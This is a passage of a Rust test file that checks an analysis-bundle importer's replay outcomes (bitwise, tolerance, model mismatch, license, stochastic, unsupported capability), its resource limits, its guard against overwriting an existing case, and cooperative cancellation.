            license_status: AnalysisLicenseStatus::ChangedOrIncompatible {
                detail: "Upstream model weights license revoked offline redistribution",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: EXACT_DET_OUT_SHA256,
                expected_byte_len: EXACT_DET_OUT.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:stochastic",
            version_id: "ver:a6",
            method_id: "method:sampling",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "temp=0.8",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::NonReplayableStochastic {
                reason: "Unseeded hardware RNG sampling",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:unsupported-cap",
            version_id: "ver:a7",
            method_id: "method:gpu",
            required_capability_id: "oia.analysis.future-gpu-solver",
            required_capability_version: 2,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=gpu",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: EXACT_DET_OUT_SHA256,
                expected_byte_len: EXACT_DET_OUT.len(),
            },
        },
    ];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:replay-suite",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:replay-01",
        local_namespace_prefix: "ws:replay",
        existing_case_ids: &[],
        capabilities: &capabilities,
        manifest_entries: &manifest_entries,
        staged_files: &staged_files,
        use_conditions: &[],
        records: &records,
        references: &[],
        omissions: &omissions,
        queries: &[],
        groupings: &[],
        calibrations: &calibrations,
        forecasts: &[],
        analyses: &analyses,
    };

    let supported = SupportedCapabilities {
        supported: &[("oia.record.evidence", 1), ("oia.analysis.core", 1)],
        allow_inert_optional_records: true,
    };
    let limits = BundleLimits::default_limits();

    // B4 + N-nonblocking 4: `max_rel_diff >= 1.0` and `-0.0` are rejected during bundle validation.
    for (bad_abs, bad_rel) in [(0.05, 1.0), (-0.0, 0.005), (0.05, -0.0)] {
        let bad_tol_analyses = [PinnedAnalysisSpec {
            replay_contract: ReplayContract::NumericalTolerance {
                expected_series: &expected_series,
                max_abs_diff: bad_abs,
                max_rel_diff: bad_rel,
                tolerance_justification: "Invalid tolerance bound must be rejected",
            },
            ..analyses[1]
        }];
        let mut bad_tol_input = input.clone();
        bad_tol_input.analyses = &bad_tol_analyses;
        assert!(matches!(
            validate_and_stage_bundle(&bad_tol_input, &supported, limits, || Ok(())),
            Err(BundleError::InvalidToleranceConfiguration { .. })
        ));
    }

    let Ok(bundle) = validate_and_stage_bundle(&input, &supported, limits, || Ok(())) else {
        return;
    };
    assert_eq!(bundle.analyses().len(), 7);

    // 1. Bitwise exact match and divergence
    let bw_ok = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            available_models: &[],
            candidate_output: CandidateReplayOutput::Bytes(EXACT_DET_OUT),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        bw_ok,
        Ok(AnalysisReplayOutcome::ReproducedBitwise { .. })
    ));

    let bw_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            available_models: &[],
            candidate_output: CandidateReplayOutput::Bytes(b"different-bytes"),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        bw_div,
        Ok(AnalysisReplayOutcome::DivergedBitwise { .. })
    ));

    // 2. Numerical tolerance match (including expected=0.0 with small non-zero actual within max_abs_diff),
    // divergence (including abs-passes-but-rel-fails and length mismatch), and missing/mismatched model
    let tol_ok = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[0.02, 10.02, 19.98, 30.01]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_ok,
        Ok(AnalysisReplayOutcome::ReproducedWithinTolerance {
            sample_count: 4,
            ..
        })
    ));

    // B4: Sample 1 has expected=10.0, actual=10.08 -> abs_diff=0.08 <= max_abs_diff (0.10),
    // but rel_diff=0.008 > max_rel_diff (0.005). Because both bounds must hold, it diverges.
    let tol_rel_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[0.0, 10.08, 20.0, 30.0]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_rel_div,
        Ok(AnalysisReplayOutcome::DivergedBeyondTolerance {
            first_failing_index: 1,
            expected_sample_count: 4,
            actual_sample_count: 4,
            expected_value: Some(_),
            actual_value: Some(_),
            abs_diff: Some(_),
            rel_diff: Some(_),
            ..
        })
    ));

    let tol_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[0.0, 10.0, 21.5, 30.0]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_div,
        Ok(AnalysisReplayOutcome::DivergedBeyondTolerance {
            first_failing_index: 2,
            expected_sample_count: 4,
            actual_sample_count: 4,
            expected_value: Some(_),
            ..
        })
    ));

    // B4 + N-nonblocking 2: Series length mismatch returns `DivergedBeyondTolerance` with `None` sample values.
    let tol_len_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[0.0, 10.0]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_len_div,
        Ok(AnalysisReplayOutcome::DivergedBeyondTolerance {
            expected_sample_count: 4,
            actual_sample_count: 2,
            first_failing_index: 2,
            expected_value: None,
            actual_value: None,
            abs_diff: None,
            rel_diff: None,
            ..
        })
    ));

    let wrong_model = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v2.0.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&expected_series),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        wrong_model,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::MissingOrMismatchedModel {
                available_version: Some(_),
                ..
            },
            ..
        })
    ));

    // 3. Unavailable/omitted source
    let omitted_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:omitted-source",
            version_id: "ver:a3",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        omitted_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::UnavailableSource {
                reason: Some(OmissionReason::Restricted),
                ..
            },
            ..
        })
    ));

    // 4. Invalidated calibration
    let cal_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:invalid-cal",
            version_id: "ver:a4",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        cal_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::InvalidatedCalibration { .. },
            ..
        })
    ));

    // 5. Changed/incompatible license
    let lic_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:license-changed",
            version_id: "ver:a5",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        lic_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::ChangedOrIncompatibleLicense { .. },
            ..
        })
    ));

    // 6. Stochastic output
    let stoch_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:stochastic",
            version_id: "ver:a6",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        stoch_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::StochasticOutput { .. },
            ..
        })
    ));

    // 7. Unsupported optional analysis capability
    let cap_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:unsupported-cap",
            version_id: "ver:a7",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        cap_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::UnsupportedCapability { .. },
            ..
        })
    ));
}

/// Verifies resource budget enforcement, existing-case overwrite protection, and cooperative
/// cancellation (`REPRO-02`, `AGENTS.md` §5).
#[test]
fn enforces_bundle_resource_budgets_case_overwrite_guard_and_cooperative_stops() {
    assert_eq!(
        BundleLimits::new(0, 1, 1, 1, 1, 1, 1, 1, 1, 1),
        Err(BundleError::ZeroLimit(BundleLimitKind::Capabilities))
    );
    assert_eq!(
        BundleLimits::new(1, 1, 1, 1, 1, 1, 0, 1, 1, 1),
        Err(BundleError::ZeroLimit(BundleLimitKind::FileBytes))
    );

    let v1_path = format!("assets/{REPORT_V1_SHA256}.txt");
    let entries = [BundleManifestEntry {
        relative_path: &v1_path,
        role: BundleEntryRole::Assets,
        media_type: "text/plain",
        declared_byte_len: REPORT_V1.len(),
        declared_sha256_hex: REPORT_V1_SHA256,
        schema_version: None,
    }];
    let staged = [StagedPayloadFile {
        relative_path: &v1_path,
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: REPORT_V1,
        rechecked_sha256_hex: None,
    }];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:limits",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:already-exists",
        local_namespace_prefix: "ws:test",
        existing_case_ids: &["case:already-exists"],
        capabilities: &[],
        manifest_entries: &entries,
        staged_files: &staged,
        use_conditions: &[],
        records: &[],
        references: &[],
        omissions: &[],
        queries: &[],
        groupings: &[],
        calibrations: &[],
        forecasts: &[],
        analyses: &[],
    };
    let supported = SupportedCapabilities {
        supported: &[],
        allow_inert_optional_records: false,
    };

    // Refuses to overwrite an existing case ID.
    assert_eq!(
        validate_and_stage_bundle(
            &input,
            &supported,
            BundleLimits::default_limits(),
            || Ok(())
        ),
        Err(BundleError::ExistingCaseOverwriteRefused {
            destination_case_id: "case:already-exists".to_owned(),
        })
    );

    // Enforces tight file-byte budget.
    let mut clean_input = input.clone();
    clean_input.existing_case_ids = &[];
    let Ok(tight_file_limits) = BundleLimits::new(8, 8, 8, 8, 8, 8, 16, 1024, 1024, 64) else {
        return;
    };
    assert_eq!(
        validate_and_stage_bundle(&clean_input, &supported, tight_file_limits, || Ok(())),
        Err(BundleError::LimitExceeded {
            limit: BundleLimitKind::FileBytes,
            actual: REPORT_V1.len(),
            max: 16,
        })
    );

    // Honors cooperative cancellation.
    assert_eq!(
        validate_and_stage_bundle(
            &clean_input,
            &supported,
            BundleLimits::default_limits(),
            || Err(StopReason::Cancelled)
        ),
        Err(BundleError::Stopped(StopReason::Cancelled))
    );
}
